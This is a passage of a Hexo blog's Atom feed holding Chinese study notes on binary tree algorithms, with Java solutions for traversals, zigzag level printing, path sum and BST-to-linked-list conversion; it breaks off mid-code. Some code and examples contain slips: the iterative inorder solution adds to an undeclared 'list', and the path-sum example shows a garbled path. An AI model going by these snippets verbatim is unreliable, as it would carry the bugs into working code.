<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Banana69</title>
  
  
  <link href="https://banana69.site/atom.xml" rel="self"/>
  
  <link href="https://banana69.site/"/>
  <updated>2023-04-12T04:34:21.669Z</updated>
  <id>https://banana69.site/</id>
  
  <author>
    <name>Banana69</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>二叉树算法</title>
    <link href="https://banana69.site/2023/04/10/binaryTree/"/>
    <id>https://banana69.site/2023/04/10/binaryTree/</id>
    <published>2023-04-09T16:00:00.000Z</published>
    <updated>2023-04-12T04:34:21.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h2><p>二叉树是一个包含 <strong>节点</strong>，以及它的 <strong>左右孩子</strong> 的一种数据结构。</p><img src="/image/binaryTree.assets/ff26c3f4485c043a17923c3dcab65891f0d32c45e1400c36364e5084462bf2e4.png" alt="img" style="zoom:50%;" /><p>如果按照 根节点 -&gt; 左孩子 -&gt; 右孩子 的方式遍历，即「先序遍历」，每次先遍历根节点，遍历结果为 1 2 4 5 3 6 7；</p><p>同理，如果按照 左孩子 -&gt; 根节点 -&gt; 右孩子 的方式遍历，即「中序序遍历」，遍历结果为 4 2 5 1 6 3 7；</p><p>如果按照 左孩子 -&gt; 右孩子 -&gt; 根节点 的方式遍历，即「后序序遍历」，遍历结果为 4 5 2 6 7 3 1；</p><p>最后，层次遍历就是按照每一层从左向右的方式进行遍历，遍历结果为 1 2 3 4 5 6 7。</p><h2 id="二叉树的前序遍历"><a href="#二叉树的前序遍历" class="headerlink" title="二叉树的前序遍历"></a>二叉树的前序遍历</h2><p>给你二叉树的根节点 root ，返回它节点值的 前序 遍历。</p><img src="/image/binaryTree.assets/1679378425598-80e93918-33b3-4101-8883-8f3b6d2958fc.png" alt="img" style="zoom:47%;" /><p>输出顺序为：中，左，右，使用递归来实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        preOrder(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        preOrder(root.left, res);</span><br><span class="line">        preOrder(root.right, res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归实现：</p><p><img src="/image/binaryTree.assets/1600934720-bMXWmu-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%89%8D%E5%BA%8F%E9%81%8D%E5%8E%86%EF%BC%88%E8%BF%AD%E4%BB%A3%E6%B3%95%EF%BC%89.gif" alt="二叉树前序遍历（迭代法）.gif"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">       List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">       <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> res;</span><br><span class="line">       &#125;</span><br><span class="line">       stack.push(root);</span><br><span class="line">       <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">           TreeNode tmp = stack.peek();</span><br><span class="line">           stack.pop();</span><br><span class="line">           res.add(tmp.val);</span><br><span class="line">           <span class="keyword">if</span>(tmp.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">               stack.push(tmp.right);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(tmp.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">               stack.push(tmp.left);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树的中序遍历"><a href="#二叉树的中序遍历" class="headerlink" title="二叉树的中序遍历"></a>二叉树的中序遍历</h2><p>按照 左孩子 -&gt; 根节点 -&gt; 右孩子 的方式遍历</p><p><img src="/image/binaryTree.assets/image-20230321212759879.png" alt="image-20230321212759879"></p><p>使用递归实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        inOrder(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrder(root.left,res);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        inOrder(root.right,res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于栈的非递归实现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line">    <span class="keyword">while</span>(cur != <span class="keyword">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">      <span class="keyword">if</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">        stack.push(cur);</span><br><span class="line">        cur = cur.left;</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        list.add(cur.val);</span><br><span class="line">        cur = cur.right;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树的后序遍历"><a href="#二叉树的后序遍历" class="headerlink" title="二叉树的后序遍历"></a>二叉树的后序遍历</h2><p><img src="/image/binaryTree.assets/64547759EAC75079FDBF501CAA589890.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：&#123;1,#,2,3&#125;</span><br><span class="line">返回值：[3,2,1]</span><br></pre></td></tr></table></figure><p>按照 左孩子 -&gt; 右孩子 -&gt; 根节点 的方式遍历</p><p>递归的实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        postOrder(root, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(TreeNode root, List&lt;Integer&gt; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        postOrder(root.left,res);</span><br><span class="line">        postOrder(root.right,res);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先序遍历是中左右，后序遍历是左右中，那么我们只需要调整一下先序遍历的代码顺序，就变成中右左的遍历顺序，然后在反转result数组，输出的结果顺序就是左右中了，如下图</p><p><img src="/image/binaryTree.assets/4f49ee1ccbd7b2d641a740d63a68f69146dc0bcb6dd5c0471e4289730d902352-image.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">      Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">      List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">      <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">          <span class="keyword">return</span> res;</span><br><span class="line">      &#125;</span><br><span class="line">      stack.push(root);</span><br><span class="line">      <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">          TreeNode node = stack.pop();</span><br><span class="line">          res.add(node.val);</span><br><span class="line">          <span class="keyword">if</span>(node.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">              stack.push(node.left);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(node.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">              stack.push(node.right);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      Collections.reverse(res);</span><br><span class="line">      <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树层次遍历"><a href="#二叉树层次遍历" class="headerlink" title="二叉树层次遍历"></a>二叉树层次遍历</h2><img src="/image/binaryTree.assets/image-20230321221655375.png" alt="image-20230321221655375" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [3,9,20,null,null,15,7]</span><br><span class="line">输出：[[3],[9,20],[15,7]]</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        queue.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">int</span> count = queue.size();</span><br><span class="line">            List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">while</span>(count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                TreeNode node = queue.poll();</span><br><span class="line">                list.add(node.val);</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(list);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 102.二叉树的层序遍历</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; resList = <span class="keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        <span class="comment">//checkFun01(root,0);</span></span><br><span class="line">        checkFun02(root);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DFS--递归方式</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkFun01</span><span class="params">(TreeNode node, Integer deep)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        deep++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (resList.size() &lt; deep) &#123;</span><br><span class="line">            <span class="comment">//当层级增加时，list的Item也增加，利用list的索引值进行层级界定</span></span><br><span class="line">            List&lt;Integer&gt; item = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            resList.add(item);</span><br><span class="line">        &#125;</span><br><span class="line">        resList.get(deep - <span class="number">1</span>).add(node.val);</span><br><span class="line"></span><br><span class="line">        checkFun01(node.left, deep);</span><br><span class="line">        checkFun01(node.right, deep);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//BFS--迭代方式--借助队列</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkFun02</span><span class="params">(TreeNode node)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">        que.offer(node);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!que.isEmpty()) &#123;</span><br><span class="line">            List&lt;Integer&gt; itemList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            <span class="keyword">int</span> len = que.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                TreeNode tmpNode = que.poll();</span><br><span class="line">                itemList.add(tmpNode.val);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (tmpNode.left != <span class="keyword">null</span>) que.offer(tmpNode.left);</span><br><span class="line">                <span class="keyword">if</span> (tmpNode.right != <span class="keyword">null</span>) que.offer(tmpNode.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            resList.add(itemList);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="剑指-Offer-32-III-从上到下打印二叉树-III"><a href="#剑指-Offer-32-III-从上到下打印二叉树-III" class="headerlink" title="剑指 Offer 32 - III. 从上到下打印二叉树 III"></a><a href="https://leetcode.cn/problems/cong-shang-dao-xia-da-yin-er-cha-shu-iii-lcof/">剑指 Offer 32 - III. 从上到下打印二叉树 III</a></h2><p>请实现一个函数按照之字形顺序打印二叉树，即第一行按照从左到右的顺序打印，第二层按照从右到左的顺序打印，第三行再按照从左到右的顺序打印，其他行以此类推。</p><p>例如:<br>给定二叉树: [3,9,20,null,null,15,7],</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> / \</span><br><span class="line">9  20</span><br><span class="line">  /  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure><p>思路：</p><p>使用队列，每次出队的时候判断左右孩子是否存在，若存在则入队，根据res容量判断是否是奇数层，若是奇数层，则对tmp做反转后再存入res</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="keyword">null</span>)&#123;</span><br><span class="line">            queue.add(root);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            List&lt;Integer&gt; tmp = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = queue.size(); i &gt; <span class="number">0</span>; i--)&#123;</span><br><span class="line">                TreeNode node  = queue.poll();</span><br><span class="line">                tmp.add(node.val);</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    queue.add(node.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(res.size() % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                Collections.reverse(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM29-二叉树中和为某一值的路径-一"><a href="#BM29-二叉树中和为某一值的路径-一" class="headerlink" title="BM29 二叉树中和为某一值的路径(一)"></a><strong>BM29</strong> <strong>二叉树中和为某一值的路径(一)</strong></h2><p>给定一个二叉树root和一个值 sum ，判断是否有从根节点到叶子节点的节点值之和等于 sum 的路径。</p><p>1.该题路径定义为从树的根结点开始往下一直到叶子结点所经过的结点</p><p>2.叶子节点是指没有子节点的节点</p><p>3.路径只能从父节点到子节点，不能从子节点到父节点</p><p>4.总节点数目为n</p><p>例如：<br>给出如下的二叉树，  <em>sum</em>=22</p><p><img src="/image/binaryTree.assets/999991351_1596786493913_8BFB3E9513755565DC67D86744BB6159.png" alt="img"></p><p>返回true，因为存在一条路径 5→4→11→25→4→11→2的节点值之和为 22</p><p>思路：</p><p>使用递归的方法，从根节点遍历到叶子，我们可以在根节点每次往下一层的时候，将sum减去节点值，最后检查是否完整等于0. 而遍历的方法我们可以选取二叉树常用的递归前序遍历，因为每次进入一个子节点，更新sum值以后，相当于对子树查找有没有等于新目标值的路径，因此这就是子问题，递归的三段式为：</p><ul><li><strong>终止条件：</strong> 每当遇到节点为空，意味着过了叶子节点，返回。每当检查到某个节点没有子节点，它就是叶子节点，此时sum减去叶子节点值刚好为0，说明找到了路径。</li><li><strong>返回值：</strong> 将子问题中是否有符合新目标值的路径层层往上返回。</li><li><strong>本级任务：</strong> 每一级需要检查是否到了叶子节点，如果没有则递归地进入子节点，同时更新sum值减掉本层的节点值。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> root TreeNode类 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sum int整型 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool布尔型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span> <span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left == <span class="keyword">null</span> &amp;&amp; root.right == <span class="keyword">null</span> &amp;&amp; sum - root.val == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hasPathSum(root.left, sum - root.val) || hasPathSum(root.right, sum - root.val);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归，使用深度优先搜索(dfs)，即从初始点开始，一直沿着同一个分支遍历，直到该分支结束，然后回溯到上一级继续沿着一个分支走到底，如此往复，直到所有的节点都有被访问到。</p><ul><li>step 1：首先检查空节点，空树没有路径。</li><li>step 2：使用两个栈同步遍历，一个栈记录节点，辅助深度优先搜索，另一个栈跟随记录到该节点为止的路径和（C++中可以在一个栈中嵌套pair实现）。根节点及根节点值先进栈。</li><li>step 3：遍历的时候每次弹出两个栈中的内容，判断是否是叶子节点且路径和是否等于目标值。</li><li>step 4：没有到叶子节点就将左右子节点（如果有）加入栈中，并跟随加入路径和。</li><li>step 5：如果遍历结束也没有找到路径和，则该二叉树中没有。</li></ul><img src="/image/binaryTree.assets/D33422A0A2A416179193EAF5EBD60154.gif" alt="alt" style="zoom:67%;" /><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> root TreeNode类 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sum int整型 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool布尔型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasPathSum</span> <span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; s1 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        Stack&lt;Integer&gt; s2 = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        s1.push(root);</span><br><span class="line">        s2.push(root.val);</span><br><span class="line">        <span class="keyword">while</span>(!s1.isEmpty())&#123;</span><br><span class="line">            TreeNode tmp = s1.pop();</span><br><span class="line">            <span class="keyword">int</span> cur_sum = s2.pop();</span><br><span class="line">            <span class="keyword">if</span>(tmp.left == <span class="keyword">null</span> &amp;&amp; tmp.right == <span class="keyword">null</span> &amp;&amp; cur_sum == sum)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(tmp.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                s1.push(tmp.left);</span><br><span class="line">                s2.push((cur_sum + tmp.left.val));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(tmp.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                s1.push(tmp.right);</span><br><span class="line">                s2.push(cur_sum + tmp.right.val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BM30-二叉搜索树与双向链表"><a href="#BM30-二叉搜索树与双向链表" class="headerlink" title="BM30 二叉搜索树与双向链表"></a><strong>BM30</strong> <strong>二叉搜索树与双向链表</strong></h2><p>输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。如下图所示</p><p><img src="/image/binaryTree.assets/image-20230328120306477.png" alt="image-20230328120306477"></p><p>注意:</p><p>1.要求不能创建任何新的结点，只能调整树中结点指针的指向。当转化完成以后，树中节点的左指针需要指向前驱，树中节点的右指针需要指向后继<br>2.返回链表中的第一个节点的指针<br>3.函数返回的TreeNode，有左右指针，其实可以看成一个双向链表的数据结构</p><p>4.你不用输出双向链表，程序会根据你的返回值自动打印输出</p><p>思路：</p><p>使用二叉树的中序遍历进行递归：</p><ul><li>step 1：创建两个指针，一个指向题目中要求的链表头（head），一个指向当前遍历的前一节点（pre)。</li><li>step 2：首先递归到最左，初始化head与pre。</li><li>step 3：然后处理中间根节点，依次连接pre与当前节点，连接后更新pre为当前节点。</li><li>step 4：最后递归进入右子树，继续处理。</li><li>step 5：递归出口即是节点为空则返回。</li></ul><p><img src="/image/binaryTree.assets/8F315406A801B462272F54DD34866AFD.gif" alt="图片说明"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode head = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode pre = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">Convert</span><span class="params">(TreeNode pRootOfTree)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pRootOfTree == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//递归到最小值</span></span><br><span class="line">        Convert(pRootOfTree.left);</span><br><span class="line">        <span class="keyword">if</span>(pre == <span class="keyword">null</span>)&#123;</span><br><span class="line">            head = pRootOfTree;</span><br><span class="line">            pre = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//与上一节点建立连接</span></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            pre.right = pRootOfTree;</span><br><span class="line">            pRootOfTree.left = pre;</span><br><span class="line">            pre = pRootOfTree;</span><br><span class="line">        &#125;</span><br><span class="line">        Convert(pRootOfTree.right);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用栈进行非递归</strong></p><ul><li>step 1：创建两个指针，一个指向题目中要求的链表头（head），一个指向当前遍历的前一节点（pre)，创建一个布尔型变量，标记是否是第一次到最左，因为第一次到最左就是链表头。</li><li>step 2：判断空树不能连接。</li><li>step 3：初始化一个栈辅助中序遍历。</li><li>step 4：依次将父节点加入栈中，直接进入二叉树最左端。</li><li>step 5：第一次进入最左，初始化head与pre，然后进入它的根节点开始连接。</li><li>step 6：最后将右子树加入栈中，栈中依次就弹出“左中右”的节点顺序，直到栈为空。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode head = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode pre = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">Convert</span><span class="params">(TreeNode pRootOfTree)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pRootOfTree == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; s = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        TreeNode head = <span class="keyword">null</span>;</span><br><span class="line">        TreeNode pre = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">boolean</span> isFirst = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(pRootOfTree != <span class="keyword">null</span> || !s.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(pRootOfTree != <span class="keyword">null</span>)&#123;</span><br><span class="line">                s.push(pRootOfTree);</span><br><span class="line">                pRootOfTree = pRootOfTree.left;</span><br><span class="line">            &#125;</span><br><span class="line">            pRootOfTree = s.pop();</span><br><span class="line">            <span class="comment">//最左的元素就是表头</span></span><br><span class="line">            <span 